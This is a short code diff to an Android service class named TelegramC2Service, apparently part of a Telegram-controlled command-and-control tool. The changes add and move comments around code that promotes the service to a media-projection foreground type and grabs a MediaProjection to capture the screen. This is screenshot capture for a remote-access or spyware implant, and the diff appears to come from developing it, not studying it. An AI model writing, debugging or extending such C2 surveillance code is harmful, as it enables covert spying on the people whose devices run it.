@@ -118,7 +118,6 @@ public class TelegramC2Service extends Service {
         if (intent != null) {
             String action = intent.getAction();
             if ("ACTION_PREPARE_SCREENSHOT".equals(action)) {
-                // FIXED: Promote service first, then launch activity
                 prepareAndLaunchScreenshot();
             } else if ("ACTION_SCREENSHOT_RESULT".equals(action)) {
                 int resultCode = intent.getIntExtra("resultCode", Activity.RESULT_CANCELED);
@@ -131,6 +130,7 @@ public class TelegramC2Service extends Service {
 
     private void prepareAndLaunchScreenshot() {
         try {
+            // ✅ Promote the service to the correct type BEFORE launching the activity
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                 startForeground(NOTIFICATION_ID, createNotification(), ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION);
             }
@@ -145,6 +145,7 @@ public class TelegramC2Service extends Service {
 
     private void handleScreenshotResult(int resultCode, Intent data) {
         try {
+            // The service is already in the correct state, so this call is now safe
             MediaProjectionManager projectionManager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
             mediaProjection = projectionManager.getMediaProjection(resultCode, data);
             if (mediaProjection != null) {
